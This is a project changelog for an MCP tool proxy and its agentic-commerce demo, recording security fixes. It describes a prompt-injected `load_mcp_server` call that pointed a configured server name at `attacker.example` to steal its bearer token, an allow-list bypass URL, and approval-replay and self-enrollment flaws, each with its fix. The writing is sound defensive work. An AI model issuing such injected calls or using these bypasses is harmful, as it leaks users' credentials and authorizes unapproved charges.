**Added: `extensible-mcp add-server`, and reload on SIGHUP**

0.3.0 bound stored tokens to URLs an operator had configured, which closed a
real exfiltration path -- a prompt-injected `load_mcp_server("notion",
"https://attacker.example/mcp")` was being handed the notion bearer -- and took
the documented "drop the token in the tokens file, then load at runtime" flow
with it. This restores that flow from the operator's side.

The distinction that makes it safe is *who possesses the credential*. The bug
was the model referencing a secret it had never seen and the proxy fetching it
on the model's behalf; passing the token in inverts that, so only a caller who
already holds it can use it, and the model holds none. It is deliberately a CLI
command and not a parameter on `load_mcp_server`: that would be safe from
exfiltration for the same reason, but it shares the surface the model drives,
and a user who pasted a token into a chat to make it work would break the rule
that tokens never transit the conversation.

The command verifies before it writes anything -- it connects as an MCP client
with the token and lists tools -- then writes the config entry and the token
(0600, atomically), and signals a running proxy. `create_server` gains an
opt-in `reload_config` hook; when the CLI supplies it, the lifespan installs a
SIGHUP handler and reconciles. Reload is additive: a server that disappeared
from the config stays connected and one whose URL changed keeps the URL it was
admitted with, because disconnecting under a signal would cancel calls in
flight and silently re-pointing a name is the substitution the token binding
exists to prevent. A changed token needs nothing -- a URL server resolves the
tokens file per call.

Three things the live run found that the unit tests had not:

- the manager captured `tokens_file` at construction, and `load_config` reports
  `None` for a file that does not exist -- which is the normal state before
  `add-server` creates one. The reload therefore connected the new server with
  no credential and got a 401. A reload now updates the manager's tokens path.
- verification followed redirects while the runtime does not, so a `/mcp/` that
  307s to `/mcp` passed the check and then failed at the proxy -- worse than not
  checking, since it reports success for something broken. Verification now
  behaves exactly as the runtime, and a redirect is reported with the URL to use
  instead. The runtime should not follow redirects: a redirect carrying an
  Authorization header is a way to hand a bearer somewhere it was not meant to
  go.
- a pid alone is not safe to signal. Python does not run `finally` on SIGTERM,
  so a stale pid file is the common case rather than the exceptional one, and
  pids are reused -- signalling a recycled one would send SIGHUP to an unrelated
  process, whose default action is to die. The proxy now holds an advisory lock
  on the pid file for its lifetime, and `add-server` signals only if something
  holds it. That also refuses a second proxy on one config, which would race on
  the same downstreams.


**Added: enrollment is authenticated (OAuth 2.0 authorization code + PKCE)**

The approval service holds the household admin's private key and signs "this
passkey holds role *parent*" for whatever key and role a request names. Its
only production caller was the passkey page's own JavaScript, where the role
was a dropdown — so the sole thing between a caller and the household's trust
anchor was reaching the page. On the compose deployment the merchant container
shares that reachability: it could enrol itself as both child and parent, trust
its own merchant key, sign an invoice, approve it twice and settle, with every
signature genuinely valid because the admin genuinely signed the enrollments.

WebAuthn was never the weak part. An assertion proves *the holder of key X
approved these exact terms*, which is what the policy needs; it cannot prove X
belongs to a particular human. That binding is made at enrollment, so the chain
was worth no more than its first link.

The page now sits behind a sign-in, and **`/register` takes the role from the
access token and ignores any `role` in the body** — authenticating the caller
while still believing the body would close nothing, since a caller could
authenticate as itself and self-assign `parent`. `/approve` requires a token
too, as defence in depth; what authorizes an approval is still possession of
the enrolled key.

Two choices worth recording. The credentials are **random per workspace**,
printed at startup: a fixed pair would be guessable in two tries, and a visible
login that is not a gate is worse than none because it stops a reader asking.
And the exchange is a **real flow rather than a password check** —
authorization code with PKCE, not the resource-owner password grant, which is
deprecated in OAuth 2.1 — so pointing the page at Entra, Keycloak, Okta or
Auth0 is configuration instead of a rewrite. That property is the whole reason
to build it this way.

Verified against the running containers: an unauthenticated `POST /register`
is refused with 401 from the host *and* from inside the merchant container,
while the page itself still serves — the gate is on the endpoint, not on page
delivery, because the merchant never loads the page.

Still unauthenticated, because their callers are processes rather than humans
and service credentials are separate work: `/trust-merchant`,
`/request-invoice`, `/settle`. The serious chain is broken (no enrollments
means no manufactured approvals), but a merchant can still add its own key to
the trusted set and put arbitrary terms in front of the humans to approve.

**Fixed: tests no longer write into the repo's workspace**

Four test modules loaded `approval_service.py` through their own copies of a
module loader. The service now builds its user store at import, so those
copies created `approval-users.json` inside the real `workspace/` — which
`setup.py` refuses to run against, breaking the manual walkthrough after any
test run. All four now use the shared loader, which gives each app a throwaway
`VC_WORKSPACE`. `setup.py`'s emptiness check also ignores that one file, so
starting the service before setup no longer wedges it.

## [0.3.0] - 2026-09-16

**Added: `local_tools` — one calling convention for every tool**

`create_server(..., local_tools=[LocalTool(...)])` registers in-process tools
alongside the downstream ones. They are indexed for `search_tools`, invoked
through `call_tool`, and pass through the same `CallFilterPipeline` as a
downstream tool — `DiscoveredToolsFilter`, access control, policy bundles, all
of it.

This closes a hole rather than adding a convenience. The commerce demo used
to register its evidence tools (`request_action_vc`,
`request_authorization_vc`, `request_invoice_approval`,
`record_fulfillment`) directly on the FastMCP object after `create_server`
returned. Every filter in this project runs inside `call_tool_handler`, so a
tool registered that way was reachable by name and subject to nothing — not
even the rule that a tool must be surfaced by `search_tools` before it can be
called. There is no principled reason an in-process tool needs less scrutiny
than a downstream one; where the code happens to live is not a security
boundary. It also cost the model real tool-call rounds, which is how the hole
was found: the chat agent had to be told that some tools were called one way
and some another.

`ServerConfig` and `LocalTool` both now reject a name containing `__` at
construction. That separator splits a qualified name back into server and
tool, so a server named with one re-parsed as a *different* server —
escaping per-server bundle routing and `allow_servers` while still being
dispatched. `load_mcp_server` rejects it too.

**Added: single-use evidence (`SingleUseEvidenceFilter`)**

A policy over signed evidence is a pure function of that evidence and the
call, so the same credentials re-sent with the same arguments decide the same
way: every signature verifies, every binding holds, and the action happens
again. Spending the evidence is state a stateless policy does not have.

This was live on the surviving wallet rail. Reproduced against the real
`family_spend_prod` bundle: one $15 request VC plus its parental
authorization, submitted three times, authorized $45 -- and the demo
downstream debits a balance per call, while the Stripe one mints a fresh
idempotency key per call, so under `DOWNSTREAM=stripe` a single approval
could charge repeatedly. It is the same shape as the flaw that retired the
passkey spend rail in this release; retiring that rail did not remove it from
the other.

`SingleUseEvidenceFilter` wraps a policy filter and spends the credential's
`jti` on a call the policy allowed, refusing any later call that carries the
same one. The `jti` is inside the signed payload, so a caller cannot vary it
without invalidating the signature -- which is what makes it usable as a
replay key, and what a challenge derived purely from the terms lacks. It
wraps rather than follows the policy filter because the policy filter strips
credential fields from the arguments it passes on, and because evidence must
be spent only when the call was actually authorized: a guard recording on
arrival would let a refused call burn the human's approval. The store is in
memory and per process, stated as such.

The commerce demo wires it around both wallet-rail bundles.
`stripe_spend_server.py`'s note about deriving an idempotency key from the
signed request is corrected: the proxy strips the evidence before forwarding,
so that server never sees it, and replay is refused upstream instead.

**Security fixes from a pre-release review**

An independent read of the tree before release turned up five issues that are
fixed here. Each was reproduced or measured, not just read.

- **A stored token could be sent to any URL the model chose.** Tokens are
  keyed by server *name*, but `load_mcp_server` lets the LLM supply both the
  name and the URL — so naming a configured server and pointing it at an
  attacker's host handed over that server's bearer token. A connection now
  presents a credential only when an operator named that exact URL for that
  name in the config file; otherwise it connects without one and logs why.
- **Host wildcards in `allow_url_patterns` were bypassable.** `fnmatch`'s `*`
  crosses `/`, so `https://*.corp.example/*` was satisfied by
  `https://attacker.example/x.corp.example/mcp` — the host constraint met by
  path content, in the control the README recommends as the SSRF defence.
  Both lists now also match the pattern's host against the URL's parsed
  host: the allow list narrows, the deny list broadens.
- **The OPA wasm heap grew without bound.** `opa_malloc` is a bump allocator
  and nothing frees, so every query's data, input, builtin results and
  result value accumulated: measured at 2 → 509 pages (33 MB) over 3000
  queries, linear. A loop of denied calls to a governed tool would exhaust
  memory, and SECURITY.md lists proxy DoS as in scope. The heap pointer is
  captured after instantiation and rewound at the top of each query;
  `_read_cstr` no longer copies all of memory per read.
- **Secrets reached image layers.** Both Dockerfiles `COPY` the repo root,
  and the `.dockerignore` files' "never bake secrets" section listed only
  `.env`. Inspecting the built image found `examples/tokens` and the
  merchant's private Ed25519 key in `/repo`: gitignored, so never in git,
  but `COPY` takes the working tree. `**/tokens`, `**/*.key`, `**/*.jwk` and
  `**/keys` are now excluded from both.
- **The family control plane was reachable from the merchant container.** The
  wallets and the policy proxy bound `0.0.0.0` on a shared compose network,
  so the merchant could drive the proxy as an MCP client or POST a wallet's
  `/sign/request` with its own prompt text and callback URL — and received
  the family's whole `.env`, `STRIPE_API_KEY` included. All three now bind
  loopback (every consumer is in the same container) and the merchant's
  `STRIPE_API_KEY` is blanked. The approval service still has to be
  reachable, since its passkey pages are published to the host;
  `deploy/README.md` now has a section stating exactly what the container
  boundary does and does not enforce, rather than implying it is the org
  boundary.

**Correctness: failures that escaped, and inputs that passed**

- A stdio reconnect after a failed call ran in the request task, but the
  transport's cancel scopes were entered in the lifespan task. The retry
  appeared to work — the cross-task error was swallowed — but the child was
  never reaped and `close_all()` from the lifespan task then hung forever, so
  the proxy could no longer shut down. Each connection now runs a task that
  owns its transport, so connect and close are safe from anywhere.
- A credential token whose payload decoded to `[]`, `"text"` or `5` raised
  `AttributeError` out of the wallet adapter, past the filter's handler and
  the guidance layer, reaching the LLM as a traceback. So did
  `{"vc": "notadict"}`. Both are now rendered denials.
- An unreachable `did:web` admin raised `DidResolutionError`, which the filter
  does not catch; the membership lookup is a fetch-plan source, so it now
  raises `FetchError` and renders as a denial.
- A CEL check evaluating to a non-empty string, map or list passed, because
  the result was read with `bool()`. A check that was meant to compare
  something but returned the thing instead therefore passed unconditionally,
  and only ever in the direction that allows. Anything but a CEL bool now
  fails closed.
- A negative `top_k` — LLM-supplied, unvalidated — reached numpy as a
  negative slice bound and returned nearly the whole index: asking for fewer
  tools got you more. Non-positive now returns none.
- The bundle selector's literal map is an exact-string lookup on a URL, so
  `https://Evil.example/mcp/` missed an entry banning
  `https://evil.example/mcp`. Scheme and host are case-folded and a trailing
  slash dropped, per RFC 3986.
- A refused downstream connection surfaced as "unhandled errors in a
  TaskGroup (1 sub-exception)"; exception groups are now unwrapped to their
  leaves before the message reaches the LLM.
- Two concurrent `load_mcp_server` calls for one name both passed the
  "already connected" check, because a network round-trip separated it from
  the registration. `connect_url` now holds a lock across both.
- `logging.basicConfig` ran at import, reconfiguring the root logger of any
  application embedding the proxy. It now runs in `main()`.
- The demo's `/settle` resolved an approved invoice by `(merchantId,
  amountCents)` and took the most recent match, so two approved invoices
  from one merchant for the same total meant the policy could verify one and
  settlement charge the other. The invoice's `nonce` now names the record,
  `charge_invoice` carries it, and the proxy's invoice adapter refuses a
  nonce that is not the one inside the signed invoice.
- Smaller, in the demo and identity packages: `/settle` no longer blocks the
  event loop (and with it the approval page's polling) while a synchronous
  payment rail runs; the console's connect-retry no longer swallows a
  shutdown's cancellation, and no longer dies when tearing down a
  half-opened transport; the entrypoint waits for the proxy to accept
  connections instead of sleeping two seconds; and the wallet holds a
  reference to its async-approval task, which asyncio could otherwise
  collect while it waited on a human.

**Packaging and CI**

- `readme` was unset, so the built wheel had no long description — a PyPI
  page would have rendered blank.
- `httpx` is imported at module scope by `client_manager` and `cryptography`
  by a wasm host builtin; both arrived transitively and are now declared
  (the latter on the `wasm` extra).
- The sdist carried only the package: no README, no LICENSE text, no tests.
  It now includes `tests/`, README, CHANGELOG, LICENSE, SECURITY and
  CONTRIBUTING.
- The `dev` group listed a hand-copied subset of the three engine extras; it
  now depends on `extensible-mcp[wasm,rego,cel]`, with `[tool.uv.sources]`
  resolving that self-reference to the workspace.
- CI installed with `uv sync --group dev`, which never installs the two
  workspace members, and ran only the root suite — so 165 tests in the
  commerce-demo and identity packages had never run in CI. All three suites
  now run, and the pinned actions are current.
- The README documented `regopy` as installed by default, true only for a
  checkout via the dev group; the extras are now documented, and the
  `RegoPolicyFilter` import error names the extra rather than a group.

**Repo hygiene**

`cd mcp-alternative` appeared in both deploy READMEs, the RUNBOOK, the
compose file and both Dockerfiles — that is a local working directory name,
and a clone lands in `extensible-mcp/`, so those steps failed for anyone
following them. `.gitignore` no longer names a private branch. Docstrings
that referred to numbered seams, lettered deliverables and "the fork" —
private working vocabulary — now say the thing itself.

**Removed: the self-asserted spend rail**

The approval page had a "Send a test request ($15 to acme)" button that
conjured a $15 spend approval from nothing, and `POST /request` behind it. The
WebAuthn challenge on that rail was a pure function of the terms —
`legov1|spend|{tool}|{amountCents}|{merchant}` — with nothing per-transaction
in it, so one passkey assertion authorized unlimited identical calls. With the
Stripe downstream enabled that meant one approval, many charges, since it
minted a fresh `uuid4()` idempotency key per call.

The invoice rail does not have this shape: its challenge is taken over a whole
merchant-signed invoice, the invoice carries a `nonce`, and settlement and
fulfilment both key on it. So rather than bolt a replay cache onto the weaker
design, the rail is gone: the button, `POST /request`,
`request_webauthn_approval`, `spend_challenge()`, and the WebAuthn wire
adapter. `payments__spend` survives, rerouted onto `family_spend_prod` — the
wallet-VC rail that binds signed intent to the call field by field — so the
`boot_demo.py` walkthrough is unaffected.

An approval request can now only be created by a merchant-signed invoice,
never from the page. The `family_spend_webauthn` bundle stays in
`tests/fixtures/` with its tests, unwired, as the artifact to fix: reinstating
the rail means giving its challenge a per-approval nonce, which changes the
canonical string and so needs the Rego and the compiled wasm re-issued
together. This also removes `legov1` from all shipped Python.

**Removed: the pre-bundle enforcement path (`VCCallFilter`)**

The demo package carried two implementations of the same job. `VCCallFilter`
verified a credential chain in hand-written Python; the policy-bundle engine
does it declaratively. Only the second one compared the signed evidence to
the call it was authorizing — the hand-coded filter checked signatures,
chain and freshness, then forwarded whatever arguments it was given, so a
credential signed for $1 would pass a call for $500. The shadow harness had
found this and a test asserted it as expected behaviour, which is what kept
it invisible.

None of it had ever shipped: `v0.1.0` is the only released tag and contains
none of this package. So rather than patch a path the bundle engine already
supersedes, it is gone — `vc_filter.py`, `shadow.py`, `extend.py`
(`extend_server`), `schema_augmenter.py`, `examples/proxy_server.py`,
`examples/price_tier_filter.py`, and their tests. Every gated call now goes
through a bundle, and the threshold that used to live in a Python filter is
a tier in the policy. `examples/README.md` is rewritten around the two
surviving entry points: `boot_demo.py` for a one-command scripted run, and
`family_proxy_server.py` for the real thing with wallets.

**README overhaul: security first**

The root README's "Why" is now two sections, `Why: Security` and
`Why: Extensibility`, in that order — security is the more important half
of this project going forward, not an addendum to the retrieval/extensibility
pitch. `Why: Security` leads with a full narrative walkthrough of the Order
Pizza demo (three signed parties — child, parent, pizza shop — and why an
agent's unsigned word for any of them isn't good enough), rather than a
one-line pointer buried in Examples. Also fixed real staleness found while
auditing every README in the repo: `examples/identity/README.md` claimed a
web approval UI was still deferred when `wallet run --approve web` already
ships and is what the containerized demo actually uses; a `fulfill` tool
description in `pizza_server.py` still said "Tony's Pizza" after the
merchant switch to Domino's.

**Commerce demo: containerized, down to 3 exposed surfaces**

Running the full pizza-negotiation demo used to mean several host shells, a
handful of browser tabs, and a `claude` CLI session — a lot of moving parts
for a demo. `examples/agentic-commerce-demo/deploy/` now exposes exactly
three things: a browser chat window driving the proxy in place of a
terminal `claude` session, a live log stream, and the 2-window passkey
approval page. Everything else (the proxy, the wallet services, the
merchant's MCP server) stays internal to the container network.

- `extensible_mcp_vc.chat_agent.ChatAgent` — a small Anthropic tool-use loop
  against the proxy's own MCP endpoint (the same three meta-tools any MCP
  client would see).
- `examples/console_server.py` — the FastAPI app serving the chat window
  and the log stream (port 7300).
- `ANTHROPIC_API_KEY` is now required for the containerized demo (it drives
  the chat console, not just the merchant's optional LLM clerk).
- The passkey approval page's amount/merchant fields now mirror the live
  pending request (blank when none, read-only, cleared and logged once it
  resolves) instead of carrying static `$15`/`acme` defaults that read as
  an already-active request.
- Stripe is opt-in at *build* time, not just at runtime: the default
  container build no longer installs the `stripe` SDK at all
  (`family.Dockerfile`'s `ENABLE_STRIPE` build arg, default `false`), so a
  released image has no path to any Stripe account regardless of env vars.
  `docker-compose.stripe.yml` is an override that builds the Stripe-enabled
  variant; it still requires your own `STRIPE_API_KEY`.
- The demo's `/logs` stream now filters out per-request access-log noise
  ("`GET /mcp HTTP/1.1" 200 OK`" and friends) so the actual narration
  (policy verdicts, settlement, tool calls) doesn't scroll off behind it.
- The pizzaparlor's merchant switched from Tony's Pizza to Domino's — Tony's
  menu had nothing at or under the $10 solo-approval threshold, so there
  was no way to see the child-only approval path with a real order. Domino's
  "cheese slice" ($4) and "small cheese" ($9) both clear it.
- The chat assistant could reach for `order_pizza`/`spend` (the wallet-VC
  rail, approved via the kid/parent wallet *pages*) instead of the
  negotiate/invoice/passkey path — and those wallet pages aren't published
  in this containerized deployment, so a request through either tool had
  nowhere to be approved and just sat there, indistinguishable from a hang.
  Fixed structurally, not just with a system-prompt instruction: when
  `HIDE_WALLET_GATED_TOOLS=true` (set by the container's entrypoint;
  unset for the manual multi-terminal walkthrough), `family_proxy_server.py`
  hides those two tools from `search_tools` outright, so
  `DiscoveredToolsFilter` makes them structurally uncallable rather than
  merely discouraged.
- Fixed a startup race that could take the whole family container down:
  `console_server.py` made exactly one attempt to connect to the proxy over
  MCP, and if the proxy hadn't finished binding yet (timing varies with
  system load), the attempt failed and — because the failure surfaced as a
  `BaseExceptionGroup` from the `mcp` client's own task group, which
  `except Exception` doesn't catch — crashed the container instead of
  retrying. Now retries with backoff and logs each attempt.

## [0.2.0] - 2026-09-10

The "v2" release. Everything below is new relative to 0.1.0, which was just
the base proxy — none of it existed yet at that tag.

**The policy-bundle engine (new)**

A bundle is a directory of artifacts — a policy plus `manifest.json` (the
closed input's JSON Schema), `fetchplan.json` (where each input field comes
from), and an optional `guidance.json` (human-facing denial text) — that a
`CallFilter` enforces against signed Verifiable-Credential evidence rather
than raw call arguments. New modules:

- `bundle.py` / `policy_engine.py` — `PolicyBundle` and the `PolicyEngine`
  Protocol, with two implementations: `OpaWasmPolicy` (compiled OPA/Rego,
  evaluated in-process via `wasmtime`, with pluggable crypto host builtins —
  `io.jwt.verify_*`, `crypto.sha256`) and `CelPolicy` (CEL, pure Python via
  `cel-python`) — proving the bundle format is engine-plural rather than
  tied to one supplier's toolchain. `PolicyBundle.load(..., engine="rego" |
  "cel")` overrides the default file-presence sniffing (`policy.wasm` vs
  `checks.cel.json`); raises `FileNotFoundError` if the forced engine's
  artifact is missing rather than silently falling through.
- `fetchplan.py` — assembles the policy's closed input by walking the
  bundle's fetch plan (`call` / `config` / `clock` / `wallet` sources);
  fail-closed if a required value can't be produced.
- `guidance.py` — renders a denial's failed-check ids into human-facing text
  from the bundle's `guidance.json`.
- `wasm_filter.py` (`VCPolicyFilter` / `WasmPolicyFilter`) — the `CallFilter`
  that ties it together: splits credential fields from native arguments,
  assembles the input, evaluates `allow`, and either strips the credentials
  and passes the call through or denies with the policy's reason.
- `wallet_bundle.py` (`WalletBundleAdapter`) — bridges household-identity's
  wallet-issued `{token, membership}` bundles into a policy's expected input
  shape (JWS decode, cents normalization, membership harvesting).
- `didweb.py` (`DidWebResolver`) — resolves `did:web` admin DIDs to their
  Ed25519 JWK for membership-chain verification; only resolves DIDs already
  in the trusted-admin set (an SSRF guard, not a substitute for the policy's
  own issuer check) and fails closed on a resolution error.
- `issuer.py` (`IssuerRegistry`) — role → wallet mapping, so a policy naming
  a role ("a parent must sign") doesn't hard-code which wallet fulfills it.
- `selection.py` / `routing.py` (`LayeredBundleSelector`, `BundleRouter`) —
  stage-one selection of which bundle governs a server (an operator literal
  map layered over an optional Rego classifier) and stage-two per-call
  dispatch to that bundle's filter. A refused server is never connected —
  for both statically configured servers **and** ones loaded at runtime via
  `load_mcp_server`, which now goes through the same admission gate.
- `augment.py` (`BundleAugmenter`) — a search-side `ToolFilter` that injects
  a governed tool's required credential fields (typed from the manifest,
  worded from `guidance.json`, ordered by dependency) into its schema before
  the LLM ever sees it.

**A fourth filter pipeline: response filters (new)**

`ResponseFilter` / `ResponseFilterPipeline` (`filters.py`, `types.py`'s new
`CallResponse` / `ResponseFilterResult`) let filters inspect, modify, or
replace a tool's result on its way back to the LLM — wired into
`create_server` via `extra_response_filters`. No built-in response filter
ships; useful for redacting secrets a downstream server leaks back, or
scrubbing prompt-injection content from scraped pages.

**Dependencies**

- `regopy` moved from a hard base dependency to an optional `rego` extra
  (alongside new `wasm` and `cel` extras) — it ships no wheels for some
  platforms and needs a C++ toolchain to build from source, which was
  needlessly required even for deployments that never use `rego_policy`.

**New examples**

- [`examples/agentic-commerce-demo/`](examples/agentic-commerce-demo/) — a
  two-organization commerce demo built on the policy-bundle engine above:
  wallet-issued Verifiable Credentials gate spends at the MCP call boundary,
  and a separate WebAuthn/passkey rail binds human approval to
  merchant-signed invoices through negotiation, settlement (mock or Stripe
  test-mode), and signed fulfillment. Ships a Docker Compose setup
  (`deploy/`) for a two-container demo of both organizations' agents.
- [`examples/identity/`](examples/identity/) — the wallet and `did:web`
  admin server backing the commerce demo's credential chain.
- Both are `uv` workspace members of this repo (see the root
  `pyproject.toml`'s `[tool.uv.workspace]`) rather than separate checkouts —
  `uv sync --all-packages` resolves everything from one lockfile.

**Fixed**

- `OpaWasmPolicy`'s EdDSA verification now accepts both `"Ed25519"`
  (RFC 9864) and `"EdDSA"` (RFC 8037) JOSE header names for the same
  signature scheme, for interop across toolchains that pick either
  convention.
- `CelPolicy.query()` now preserves the `allow ⟺ failed_checks == []`
  invariant that Rego bundles get structurally, which it had missed on a
  real production bundle's repro case.

**Unchanged**

- `RegoPolicyFilter` (the `rego_policy` config option — one `.rego` file,
  no bundle, no manifest, no signed evidence) is untouched by any of the
  above. It interprets raw Rego source at call time against
  `{tool_name, arguments, server_name}` and only defines `allow` /
  `deny_reason`; it does not implement `PolicyEngine` and has no CEL
  equivalent. Reach for the bundle engine, not this option, if you need CEL
  or verified credentials.

## [0.1.0] - 2026-04-30

First public release: dynamic MCP server loading, RAG-based tool retrieval,
and three filter pipelines (search / call / server-load) — access control,
the single-file `rego_policy` option, server-load whitelisting, and the
structural "can't call what you haven't searched for" guarantee.
